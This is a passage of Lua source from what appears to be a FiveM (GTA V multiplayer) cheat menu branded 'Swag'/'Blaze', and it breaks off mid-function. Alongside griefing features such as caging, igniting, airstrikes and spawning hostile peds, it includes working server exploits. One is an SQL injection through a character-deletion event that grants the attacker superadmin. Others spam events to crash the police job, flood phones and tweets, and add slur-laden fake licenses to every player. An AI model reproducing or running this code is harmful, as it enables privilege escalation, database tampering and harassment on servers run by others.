	local cage1 = CreateObject(cagehash, x, y, z-1, true, true, false)
	local cage2 = CreateObject(cagehash, x, y, z+1, true, true, false)
	SetEntityRotation(cage2, 0.0, 180.0, 90.0)
	FreezeEntityPosition(cage1, true)
	FreezeEntityPosition(cage2, true)
end

function CageP(SelectedPlayer)
	x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
	roundx = tonumber(string.format("%.2f", x))
	roundy = tonumber(string.format("%.2f", y))
	roundz = tonumber(string.format("%.2f", z))
	local cagemodel = "hei_prop_ss1_mpint_garage2"
	local cagehash = GetHashKey(cagemodel)
	RequestModel(cagehash)
	while not HasModelLoaded(cagehash) do
	  Citizen.Wait(0)
	end
	local cage1 = CreateObject(cagehash, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
	local cage2 = CreateObject(cagehash, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
	SetEntityHeading(cage1, -90.0)
	SetEntityHeading(cage2, 90.0)
	FreezeEntityPosition(cage1, true)
	FreezeEntityPosition(cage2, true)
end

function HamburgerP(SelectedPlayer)
	local hamburg = "xs_prop_hamburgher_wl"
	local hamburghash = GetHashKey(hamburg)
	local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
	AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)

end

function HamburgerC(SelectedPlayer)
    local hamburg = "xs_prop_hamburgher_wl"
	local hamburghash = GetHashKey(hamburg)
	local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
	AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
end

function Swag.Game.SetVehicleProperties()
	if DoesEntityExist(vehicle) then
		local colorPrimary, colorSecondary = GetVehicleColours(vehicle)
		local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
		SetVehicleModKit(vehicle, 0)

		if props.plate then SetVehicleNumberPlateText(vehicle, props.plate) end
		if props.plateIndex then SetVehicleNumberPlateTextIndex(vehicle, props.plateIndex) end
		if props.bodyHealth then SetVehicleBodyHealth(vehicle, props.bodyHealth + 0.0) end
		if props.engineHealth then SetVehicleEngineHealth(vehicle, props.engineHealth + 0.0) end
		if props.fuelLevel then SetVehicleFuelLevel(vehicle, props.fuelLevel + 0.0) end
		if props.dirtLevel then SetVehicleDirtLevel(vehicle, props.dirtLevel + 0.0) end
		if props.color1 then SetVehicleColours(vehicle, props.color1, colorSecondary) end
		if props.color2 then SetVehicleColours(vehicle, props.color1 or colorPrimary, props.color2) end
		if props.pearlescentColor then SetVehicleExtraColours(vehicle, props.pearlescentColor, wheelColor) end
		if props.wheelColor then SetVehicleExtraColours(vehicle, props.pearlescentColor or pearlescentColor, props.wheelColor) end
		if props.wheels then SetVehicleWheelType(vehicle, props.wheels) end
		if props.windowTint then SetVehicleWindowTint(vehicle, props.windowTint) end

		if props.neonEnabled then
			SetVehicleNeonLightEnabled(vehicle, 0, props.neonEnabled[1])
			SetVehicleNeonLightEnabled(vehicle, 1, props.neonEnabled[2])
			SetVehicleNeonLightEnabled(vehicle, 2, props.neonEnabled[3])
			SetVehicleNeonLightEnabled(vehicle, 3, props.neonEnabled[4])
		end

		if props.extras then
			for id,enabled in pairs(props.extras) do
				if enabled then
					SetVehicleExtra(vehicle, tonumber(id), 0)
				else
					SetVehicleExtra(vehicle, tonumber(id), 1)
				end
			end
		end

		if props.neonColor then SetVehicleNeonLightsColour(vehicle, props.neonColor[1], props.neonColor[2], props.neonColor[3]) end
		if props.xenonColor then SetVehicleXenonLightsColour(vehicle, props.xenonColor) end
		if props.modSmokeEnabled then ToggleVehicleMod(vehicle, 20, true) end
		if props.tyreSmokeColor then SetVehicleTyreSmokeColor(vehicle, props.tyreSmokeColor[1], props.tyreSmokeColor[2], props.tyreSmokeColor[3]) end
		if props.modSpoilers then SetVehicleMod(vehicle, 0, props.modSpoilers, false) end
		if props.modFrontBumper then SetVehicleMod(vehicle, 1, props.modFrontBumper, false) end
		if props.modRearBumper then SetVehicleMod(vehicle, 2, props.modRearBumper, false) end
		if props.modSideSkirt then SetVehicleMod(vehicle, 3, props.modSideSkirt, false) end
		if props.modExhaust then SetVehicleMod(vehicle, 4, props.modExhaust, false) end
		if props.modFrame then SetVehicleMod(vehicle, 5, props.modFrame, false) end
		if props.modGrille then SetVehicleMod(vehicle, 6, props.modGrille, false) end
		if props.modHood then SetVehicleMod(vehicle, 7, props.modHood, false) end
		if props.modFender then SetVehicleMod(vehicle, 8, props.modFender, false) end
		if props.modRightFender then SetVehicleMod(vehicle, 9, props.modRightFender, false) end
		if props.modRoof then SetVehicleMod(vehicle, 10, props.modRoof, false) end
		if props.modEngine then SetVehicleMod(vehicle, 11, props.modEngine, false) end
		if props.modBrakes then SetVehicleMod(vehicle, 12, props.modBrakes, false) end
		if props.modTransmission then SetVehicleMod(vehicle, 13, props.modTransmission, false) end
		if props.modHorns then SetVehicleMod(vehicle, 14, props.modHorns, false) end
		if props.modSuspension then SetVehicleMod(vehicle, 15, props.modSuspension, false) end
		if props.modArmor then SetVehicleMod(vehicle, 16, props.modArmor, false) end
		if props.modTurbo then ToggleVehicleMod(vehicle,  18, props.modTurbo) end
		if props.modXenon then ToggleVehicleMod(vehicle,  22, props.modXenon) end
		if props.modFrontWheels then SetVehicleMod(vehicle, 23, props.modFrontWheels, false) end
		if props.modBackWheels then SetVehicleMod(vehicle, 24, props.modBackWheels, false) end
		if props.modPlateHolder then SetVehicleMod(vehicle, 25, props.modPlateHolder, false) end
		if props.modVanityPlate then SetVehicleMod(vehicle, 26, props.modVanityPlate, false) end
		if props.modTrimA then SetVehicleMod(vehicle, 27, props.modTrimA, false) end
		if props.modOrnaments then SetVehicleMod(vehicle, 28, props.modOrnaments, false) end
		if props.modDashboard then SetVehicleMod(vehicle, 29, props.modDashboard, false) end
		if props.modDial then SetVehicleMod(vehicle, 30, props.modDial, false) end
		if props.modDoorSpeaker then SetVehicleMod(vehicle, 31, props.modDoorSpeaker, false) end
		if props.modSeats then SetVehicleMod(vehicle, 32, props.modSeats, false) end
		if props.modSteeringWheel then SetVehicleMod(vehicle, 33, props.modSteeringWheel, false) end
		if props.modShifterLeavers then SetVehicleMod(vehicle, 34, props.modShifterLeavers, false) end
		if props.modAPlate then SetVehicleMod(vehicle, 35, props.modAPlate, false) end
		if props.modSpeakers then SetVehicleMod(vehicle, 36, props.modSpeakers, false) end
		if props.modTrunk then SetVehicleMod(vehicle, 37, props.modTrunk, false) end
		if props.modHydrolic then SetVehicleMod(vehicle, 38, props.modHydrolic, false) end
		if props.modEngineBlock then SetVehicleMod(vehicle, 39, props.modEngineBlock, false) end
		if props.modAirFilter then SetVehicleMod(vehicle, 40, props.modAirFilter, false) end
		if props.modStruts then SetVehicleMod(vehicle, 41, props.modStruts, false) end
		if props.modArchCover then SetVehicleMod(vehicle, 42, props.modArchCover, false) end
		if props.modAerials then SetVehicleMod(vehicle, 43, props.modAerials, false) end
		if props.modTrimB then SetVehicleMod(vehicle, 44, props.modTrimB, false) end
		if props.modTank then SetVehicleMod(vehicle, 45, props.modTank, false) end
		if props.modWindows then SetVehicleMod(vehicle, 46, props.modWindows, false) end

		if props.modLivery then
			SetVehicleMod(vehicle, 48, props.modLivery, false)
			SetVehicleLivery(vehicle, props.modLivery)
		end
	end
end

function SpawnVehicleToPlayer(modelName, playerIdx)
	if modelName and IsModelValid(modelName) and IsModelAVehicle(modelName) then
		RequestModel(modelName)
		while not HasModelLoaded(modelName) do Citizen.Wait(0) end
		local model = (type(modelName) == 'number' and modelName or GetHashKey(modelName))
		local playerPed = GetPlayerPed(playerIdx)
		local SpawnedVehicle = CreateVehicle(model, GetEntityCoords(playerPed), GetEntityHeading(playerPed), true, true)
		local SpawnedVehicleIdx = NetworkGetNetworkIdFromEntity(SpawnedVehicle)
		SetNetworkIdCanMigrate(SpawnedVehicleIdx, true)
		SetEntityAsMissionEntity(SpawnedVehicle, true, false)
		SetVehicleHasBeenOwnedByPlayer(SpawnedVehicle, true)
		SetVehicleNeedsToBeHotwired(SpawnedVehicle, false)
		SetModelAsNoLongerNeeded(model)

		SetPedIntoVehicle(playerPed, SpawnedVehicle, -1)
		SetVehicleEngineOn(SpawnedVehicle, true, false, false)
		SetVehRadioStation(SpawnedVehicle, 'OFF')
		return SpawnedVehicle 
	end
end

function ClonePV(target)
	local selectedPlayerVehicle = nil
	if IsPedInAnyVehicle(GetPlayerPed(target)) then selectedPlayerVehicle = GetVehiclePedIsIn(GetPlayerPed(target), false)
	else selectedPlayerVehicle = GetVehiclePedIsIn(GetPlayerPed(target), true) end

	if DoesEntityExist(selectedPlayerVehicle) then
		local vehicleModel = GetEntityModel(selectedPlayerVehicle)
		local spawnedVehicle = SpawnVehicleToPlayer(vehicleModel, PlayerId())

		local vehicleProperties = Swag.Game.GetVehicleProperties(selectedPlayerVehicle)
		vehicleProperties.plate = nil

		Swag.Game.SetVehicleProperties(spawnedVehicle, vehicleProperties)

		SetVehicleEngineOn(spawnedVehicle, true, false, false)
		SetVehRadioStation(spawnedVehicle, 'OFF')
	end
end

function CloneP(ped)
	local me = PlayerPedId()

	hat = GetPedPropIndex(ped, 0)
	hat_texture = GetPedPropTextureIndex(ped, 0)
	
	glasses = GetPedPropIndex(ped, 1)
	glasses_texture = GetPedPropTextureIndex(ped, 1)
	
	ear = GetPedPropIndex(ped, 2)
	ear_texture = GetPedPropTextureIndex(ped, 2)
	
	watch = GetPedPropIndex(ped, 6)
	watch_texture = GetPedPropTextureIndex(ped, 6)
	
	wrist = GetPedPropIndex(ped, 7)
	wrist_texture = GetPedPropTextureIndex(ped, 7)
	
	head_drawable = GetPedDrawableVariation(ped, 0)
	head_palette = GetPedPaletteVariation(ped, 0)
	head_texture = GetPedTextureVariation(ped, 0)
	
	beard_drawable = GetPedDrawableVariation(ped, 1)
	beard_palette = GetPedPaletteVariation(ped, 1)
	beard_texture = GetPedTextureVariation(ped, 1)
	
	hair_drawable = GetPedDrawableVariation(ped, 2)
	hair_palette = GetPedPaletteVariation(ped, 2)
	hair_texture = GetPedTextureVariation(ped, 2)
	
	torso_drawable = GetPedDrawableVariation(ped, 3)
	torso_palette = GetPedPaletteVariation(ped, 3)
	torso_texture = GetPedTextureVariation(ped, 3)
	
	legs_drawable = GetPedDrawableVariation(ped, 4)
	legs_palette = GetPedPaletteVariation(ped, 4)
	legs_texture = GetPedTextureVariation(ped, 4)
	
	hands_drawable = GetPedDrawableVariation(ped, 5)
	hands_palette = GetPedPaletteVariation(ped, 5)
	hands_texture = GetPedTextureVariation(ped, 5)
	
	foot_drawable = GetPedDrawableVariation(ped, 6)
	foot_palette = GetPedPaletteVariation(ped, 6)
	foot_texture = GetPedTextureVariation(ped, 6)
	
	acc1_drawable = GetPedDrawableVariation(ped, 7)
	acc1_palette = GetPedPaletteVariation(ped, 7)
	acc1_texture = GetPedTextureVariation(ped, 7)
	
	acc2_drawable = GetPedDrawableVariation(ped, 8)
	acc2_palette = GetPedPaletteVariation(ped, 8)
	acc2_texture = GetPedTextureVariation(ped, 8)
	
	acc3_drawable = GetPedDrawableVariation(ped, 9)
	acc3_palette = GetPedPaletteVariation(ped, 9)
	acc3_texture = GetPedTextureVariation(ped, 9)
	
	mask_drawable = GetPedDrawableVariation(ped, 10)
	mask_palette = GetPedPaletteVariation(ped, 10)
	mask_texture = GetPedTextureVariation(ped, 10)
	
	aux_drawable = GetPedDrawableVariation(ped, 11)
	aux_palette = GetPedPaletteVariation(ped, 11) 	
	aux_texture = GetPedTextureVariation(ped, 11)

	SetPedPropIndex(me, 0, hat, hat_texture, 1)
	SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
	SetPedPropIndex(me, 2, ear, ear_texture, 1)
	SetPedPropIndex(me, 6, watch, watch_texture, 1)
	SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
	
	SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
	SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
	SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
	SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
	SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
	SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
	SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
	SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
	SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
	SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
	SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
	SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
end

function TubePlayer(SelectedPlayer)
	Citizen.CreateThread(function()
		rotatier = true
		x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
		roundx = tonumber(string.format("%.2f", x))
		roundy = tonumber(string.format("%.2f", y))
		roundz = tonumber(string.format("%.2f", z))
		local tubemodel = "sr_prop_spec_tube_xxs_01a"
		local tubehash = GetHashKey(tubemodel)
		RequestModel(tubehash)
		RequestModel(smashhash)
		while not HasModelLoaded(tubehash) do
		  Citizen.Wait(0)
		end
		local tube = CreateObject(tubehash, roundx, roundy, roundz - 5.0, true, true, false)
		SetEntityRotation(tube, 0.0, 90.0, 0.0)
		local snowhash = -356333586
		local wep = "WEAPON_SNOWBALL"
		for i = 0, 10 do
			local coords = GetEntityCoords(tube)
			RequestModel(snowhash)
			Citizen.Wait(50)
			if HasModelLoaded(snowhash) then
				local ped = CreatePed(21, snowhash, coords.x + math.sin(i * 2.0), coords.y - math.sin(i * 2.0), coords.z - 5.0, 0, true, true) and CreatePed(21, snowhash ,coords.x - math.sin(i * 2.0), coords.y + math.sin(i * 2.0), coords.z - 5.0, 0, true, true)
				NetworkRegisterEntityAsNetworked(ped)
				if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
					local netped = PedToNet(ped)
					NetworkSetNetworkIdDynamic(netped, false)
					SetNetworkIdCanMigrate(netped, true)
					SetNetworkIdExistsOnAllMachines(netped, true)
					Citizen.Wait(500)
					NetToPed(netped)
					GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
					SetCurrentPedWeapon(ped, GetHashKey(wep), true)
					SetEntityInvincible(ped, true)
					SetPedCanSwitchWeapon(ped, true)
					TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
				elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
					TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
				else
					Citizen.Wait(0)
				end
			end
		end
	end)
end

function FlingingPlayer(target)
	local coords = GetEntityCoords(GetPlayerPed(target))
	for i = 0, 10 do
	Citizen.InvokeNative(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z, 4, 1.0, 0, 1, 0.0, 1)
	end
end


local function SetEntityAsNoLongerNeeded(entity)
	Citizen.InvokeNative(0xB736A491E64A32CF, Citizen.PointerValueIntInitialized(entity))
end

function MeteorThread()
	while Swag.Toggle.MeteoriteMode do
		Wait(1)

		local ptfx = "core"
		local fx = "fire_petroltank_plane"
		local fx_loop = 25
		local i=0

		local playerPed = GetPlayerPed(-1)
		if playerPed then
			local x, y, z = table.unpack(GetEntityCoords(playerPed, true))
			local rock = GetHashKey("prop_rock_4_d")

			RequestModel(rock)
			if not HasModelLoaded(rock) then
				Wait(1)
			end
			local rockloc = GetEntityCoords(rock)
			local rX = x + math.random(-75, 75)
			local rY = y + math.random(-75, 75)
			local rZ = z + 50

			local obj = CreateObject(rock, rX, rY, rZ, true, true, true)
			SetEntityDynamic(obj, true)
			SetObjectPhysicsParams(obj, 99999.0, 0.0, 0.0, 0.0, 0.0, 700.0, 0.0, 0.0, 0.0, 0.0, 0.0)
			RequestNamedPtfxAsset(ptfx)
			StartParticleFxLoopedOnEntity(fx, rock, 0, 0, 0, 0, 0, 0, 10, true, true, true)
			--START_PARTICLE_FX_LOOPED_ON_ENTITY(char* effectName, Entity entity, float xOffset, float yOffset, float zOffset, float xRot, float yRot, float zRot, float scale, BOOL xAxis, BOOL yAxis, BOOL zAxis);
			SetEntityVelocity(obj, 0.0, 0.0, math.random() + math.random(-1000, -500))
			
			Wait(500)
			SetEntityAsNoLongerNeeded(obj)
		end
	end
end

local function MeteoriteMode()
    Swag.Toggle.MeteoriteMode = not Swag.Toggle.MeteoriteMode
    
	if Swag.Toggle.MeteoriteMode then

        CreateThread(MeteorThread)
	end
end



local function shoot_player_with(player, weapon, damage)
	local ped = player
	local tLoc = GetEntityCoords(ped)

	local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
	local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



	ShootSingleBulletBetweenCoords(origin, destination, damage, true, weapon, PlayerPedId(), true, false, 1.0)
end

local function IgnitePlayer(player)
	local ped = GetPlayerPed(player)

	RequestControlOnce(ped)

	if IsEntityOnFire(ped) then
		StopEntityFire(ped)
		return true
	end

	StartEntityFire(ped)
	return true
end

local isAirstrikeRunning = false

local Airstrike = {
	ped_hash = `S_M_Y_MARINE_01`,
	vehicle_hash = `STRIKEFORCE`,
	weapon_asset = 519052682,
	spawnDistance = 750.0,
}
-- 955522731
-- 519052682

RequestModel(Airstrike.ped_hash)
RequestModel(Airstrike.vehicle_hash)
RequestWeaponAsset(Airstrike.weapon_asset, 31, 0)


local function AirstrikePlayer(player)
	if isAirstrikeRunning then
		return SwagUI.SendNotification({text = "Wait until the current airstrike is complete", type = "error"}) 
	end

	local function AirstrikeThread()
		isAirstrikeRunning = true
		
		local playerPed = GetPlayerPed(player)
		local target = GetEntityCoords(playerPed)
		local origin = target + vector3(Airstrike.spawnDistance, Airstrike.spawnDistance, 725.0)
		
		repeat
			Wait(0)
		until HasModelLoaded(Airstrike.ped_hash) and HasModelLoaded(Airstrike.vehicle_hash)
	
		repeat
			Wait(0)
		until HasWeaponAssetLoaded(Airstrike.weapon_asset)
		
		-- Create Aircraft
		local aircraft = CreateVehicle(Airstrike.vehicle_hash, origin, 0.0, true, true)
		FreezeEntityPosition(aircraft, true)
		
		-- Register with network and give up network ownership
		-- NetworkRegisterEntityAsNetworked(aircraft)
		local netVehid = NetworkGetNetworkIdFromEntity(aircraft)
		SetNetworkIdCanMigrate(netVehid, true)
		NetworkSetNetworkIdDynamic(netVehid, false)
		-- NetworkSetEntityCanBlend(netVehid, true)
		-- NetworkSetChoiceMigrateOptions(true, player)
		-- SetNetworkIdExistsOnAllMachines(netVehid, true)

		aircraft = NetToVeh(netVehid)

		-- Create pilot and block temporary events
		local pilot = CreatePedInsideVehicle(NetToVeh(netVehid), 29, Airstrike.ped_hash, -1, true, true)

		-- Give up network ownership of ped
		-- NetworkRegisterEntityAsNetworked(pilot)
		local netPedid = NetworkGetNetworkIdFromEntity(pilot)
		SetNetworkIdCanMigrate(netPedid, true)
		NetworkSetNetworkIdDynamic(netPedid, false)
		-- NetworkSetEntityCanBlend(netPedid, true)
		-- NetworkSetChoiceMigrateOptions(true, player)
		-- SetNetworkIdExistsOnAllMachines(netPedid, true)

		pilot = NetToPed(netPedid)

		SetBlockingOfNonTemporaryEvents(pilot, true)
		SetDriverAbility(pilot, 1.0)
		-- Make sure the vehicle engine is started
		SetVehicleJetEngineOn(aircraft, true)
		SetVehicleEngineOn(aircraft, true, true, true)
		
		-- Retract landing gear for fast flight
		ControlLandingGear(aircraft, 3)

		-- Disable turbulence
		SetPlaneTurbulenceMultiplier(aircraft, 0.0)

		-- Make sure the vehicle is marked as unowned by Player
		SetVehicleHasBeenOwnedByPlayer(aircraft, false)

		SetVehicleForceAfterburner(aircraft, true)
		local blip = AddBlipForEntity(aircraft)
		
		-- Disabled rockets (CExplosionEvent bypass)
		SetCurrentPedVehicleWeapon(pilot, Airstrike.weapon_asset)

		FreezeEntityPosition(aircraft, false)
		--TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
		TaskPlaneMission(pilot, NetToVeh(netVehid), 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)
		SetPedKeepTask(pilot, true)
		SetDriveTaskCruiseSpeed(pilot, 150.0)

		while true do
			local target = GetEntityCoords(playerPed)
			local vehCoords = GetEntityCoords(aircraft)
			local distance = GetDistanceBetweenCoords(vehCoords, target)
			--DisableVehicleWeapon(true, 519052682, aircraft, pilot)
			--SetCurrentPedVehicleWeapon(pilot, 519052682)

			if not NetworkDoesEntityExistWithNetworkId(netVehid) then
				isAirstrikeRunning = false
				-- NetworkUnregisterNetworkedEntity(pilot)
				-- NetworkUnregisterNetworkedEntity(aircraft)
				-- SetEntityAsMissionEntity(aircraft)
				-- DeletePed(pilot)
				-- DeleteVehicle(aircraft)
	
				-- RemoveBlip(blip)
				return SwagUI.SendNotification({text = "We lost network control, try again.", type = "error"})
			end

			if distance > 150.0 then
				TaskPlaneMission(pilot, aircraft, 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)
				-- TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
			end

			if distance <= 150.0 then
				--TaskVehicleShootAtCoord(pilot, coords, 0.5)
				ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, target.x, target.y, target.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
				for i = 1, 11 do
				 	local coords = GetEntityCoords(aircraft)
					local target = GetEntityCoords(playerPed)
					local offset = target + vector3(math.random(-8.0, 8.0), math.random(-8.0, 8.0), 0.0)
					
					-- SetVehicleShootAtTarget(pilot, aircraft, coords.x, coords.y, coords.z)
					-- print(offset)
					ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z - 2.0, offset.x, offset.y, offset.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
					
					Wait(100)
				end
				TaskVehicleDriveToCoord(pilot, aircraft, origin, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
				
				Wait(10000)
				NetworkUnregisterNetworkedEntity(pilot)
				NetworkUnregisterNetworkedEntity(aircraft)
				DeletePed(pilot)
				SetEntityAsMissionEntity(aircraft, true, true)
				DeleteVehicle(aircraft)
	
				RemoveBlip(blip)

				SwagUI.SendNotification({text = ("Airstrike on %s is complete!"):format(GetPlayerName(player)), type = "info"})
				break
			end
			Wait(0)
		end
	
		isAirstrikeRunning = false
	end
	CreateThreadNow(AirstrikeThread)
end
--Player Troll Ends
--Esx Earrrape troll
function doesResourceExist(resource_name)
	if GetResourceState(resource_name) == "started" or 
		string.upper(GetResourceState(resource_name)) == "started" or 
		string.lower(GetResourceState(resource_name)) == "started" then
		return true
	else
		return false
	end
end

function interactSound() 
	if doesResourceExist('interactSound') or 
	doesResourceExist('InteractSound') or 
	doesResourceExist('interact-sound') then
		TriggerCustomEvent(true, 'InteractSound_SV:PlayOnAll', 'demo', 10.0)
		TriggerCustomEvent(true, 'InteractSound_SV:PlayWithinDistance', 500.0, 'demo', 10.0)
	end
end

function esx_license()
	if doesResourceExist("esx_license" ) then 
		local licenses={"Swag" ,"Swag.UI" ,"Blaze" ,"RIP Your SQL Faggot" ,"Make sure to wipe all tables ;)","Swag Was Here" }
		for i=0 ,#licenses do 
			local active_players=GetActivePlayers()
			for player=0 ,#active_players do 
				TriggerCustomEvent(table_10 ,"esx_license:addLicense" ,player,licenses[i], function()cb(table_10 )
					print("added license " ..licenses[i].." to " ..player)
				end)
			end
		end
	end
end

function esx_kashacters()
    if
        doesResourceExist("esx_kashacters") or doesResourceExist("esx_Kashacters") or
            doesResourceExist("Kashacters") or
            doesResourceExist("kashacters")
     then
        TriggerCustomEvent(
            true,
            "kashactersS:DeleteCharacter",
            "';UPDATE users SET permission_level=4, group='superadmin' WHERE name='" ..
                NetworkPlayerGetName(PlayerId()) .. "'--"
        )
    end
end

PhoneSpam = function()
    if
        doesResourceExist("esx_phone") or doesResourceExist("gcphone") or
           doesResourceExist("xenknight")
     then
        TriggerCustomEvent(
            true,
            "esx_phone:send",
            "police",
            "Blaze Menu",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerCustomEvent(
            true,
            "esx_phone:send",
            "ambulance",
            "Blaze Menu",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerCustomEvent(
            true,
            "esx_phone:send",
            "taxi",
            "Blaze Menu",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerCustomEvent(
            true,
            "esx_phone:send",
            "realestateagent",
            "Blaze Menu",
            true,
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
    elseif doesResourceExist("esx_addons_gcphone") then
        TriggerCustomEvent(
            true,
            "esx_addons_gcphone:startCall",
            "police",
            "Blaze Menu",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerCustomEvent(
            true,
            "esx_addons_gcphone:startCall",
            "ambulance",
            "Blaze Menu",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerCustomEvent(
            true,
            "esx_addons_gcphone:startCall",
            "taxi",
            "Blaze Menu",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
        TriggerCustomEvent(
            true,
            "esx_addons_gcphone:startCall",
            "realestateagent",
            "Blaze Menu",
            {x = 1337.0, y = 1337.0, z = 1337.0}
        )
    end
end

esx_policejob_crash = function()
    if doesResourceExist("esx_policejob") then
        Citizen.CreateThread(
            function()
                for i = 1, 50, 1 do
                    Citizen.Wait(50)
                    TriggerCustomEvent(true, "esx_policejob:spawned")
                end
            end
        )
    end
end

esx_outlawalert = function()
    if doesResourceExist("esx_outlawalert") then
        TriggerCustomEvent(
            true,
            "esx_outlawalert:gunshotInProgress",
            {x = 1337.0, y = 1337.0, z = 1337.0},
            "Blaze Menu",
            0
        )
    end
end

function communityService(sid)
    if doesResourceExist("ESX_CommunityService") or doesResourceExist("esx_CommunityService") then
        TriggerCustomEvent(true, "esx_communityservice:sendToCommunityService", sid, 5391)
    end
end

function gcphoneTwitter () 
    if doesResourceExist("gcphone") or doesResourceExist("xenknight") then
        Citizen.CreateThread(
            function()
                TriggerCustomEvent(
                    true,
                    "gcPhone:twitter_createAccount",
                    "Blaze Menu",
                    "Blaze",
                    "https://www.cjnews.com/wp-content/uploads/2012/01/gay-640x588.jpg"
                )
                Citizen.Wait(1500)
                TriggerCustomEvent(true, "gcPhone:twitter_login", "Blaze", "Blaze")
                Citizen.Wait(1500)
                for i = 1, 50 do
                    TriggerCustomEvent(
                        true,
                        "gcPhone:twitter_postTweets",
                        "Blaze",
                        "Blaze",
                        "Blaze Menu > all"
                    )
                    Citizen.Wait(50)
                end
            end
        )
    end
end

function esx_license()
    if doesResourceExist("esx_license") then
        local sk_ = {
            "Blaze",
            "Blaze",
            "Blaze",
            "RIP Your SQL Faggot",
            "Make sure to wipe all tables ;)",
            "Blaze Was Here"
        }
        for i = 0, #sk_ do
            local WXZmMBl8PTItNNdN = GetActivePlayers()
            for player = 0, #WXZmMBl8PTItNNdN do
                TriggerCustomEvent(
                    true,
                    "esx_license:addLicense",
                    player,
                    sk_[i],
                    function()
                        cb(true)
                        print("added license " .. sk_[i] .. " to " .. player)
                    end
                )
            end
        end
    end
end
--Esx Earrrape troll ends

resetAppearance = function()
    ClearAllPedProps(PlayerPedId())
    ClearPedDecorations(PlayerPedId())
    SetPedComponentVariation(PlayerPedId(), 1, 0, 0, 0)
    SetPedComponentVariation(PlayerPedId(), 5, 0, 0, 0)
    SetPedComponentVariation(PlayerPedId(), 9, 0, 0, 0)
end

changeAppearance = function(Ctype, drawable_id, texture_id)
    if (Ctype == "HATS" or Ctype == "GLASSES" or Ctype == "EARS") then
        if (Ctype == "HATS") then
            fam = 0
        elseif (Ctype == "GLASSES") then
            fam = 1
        elseif (Ctype == "EARS") then
            fam = 2
        end
        SetPedPropIndex(PlayerPedId(), fam, drawable_id - 1, texture_id, 1)
    else
        if (Ctype == "FACE") then
            fam = 0
        elseif (Ctype == "MASK") then
            fam = 1
        elseif (Ctype == "HAIR") then
            fam = 2
        elseif (Ctype == "TORSO") then
            fam = 3
        elseif (Ctype == "LEGS") then
            fam = 4
        elseif (Ctype == "HANDS") then
            fam = 5
        elseif (Ctype == "SHOES") then
            fam = 6
        elseif (Ctype == "SPECIAL1") then
            fam = 7
        elseif (Ctype == "SPECIAL2") then
            fam = 8
        elseif (Ctype == "SPECIAL3") then
            fam = 9
        elseif (Ctype == "TEXTURE") then
            fam = 10
        elseif (Ctype == "TORSO2") then
            fam = 11
        end
        SetPedComponentVariation(PlayerPedId(), fam, drawable_id, texture_id, 0)
    end
end


--Spawn Peds

function spawn_ped_with(SelectedPlayer, ped_name, weapon, amount)
    Citizen.CreateThread(function()
        local pedname = ped_name
        local wep = weapon
        for i = 0, amount do
            local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
            RequestModel(GetHashKey(pedname))
            Citizen.Wait(50)
            if HasModelLoaded(GetHashKey(pedname)) then
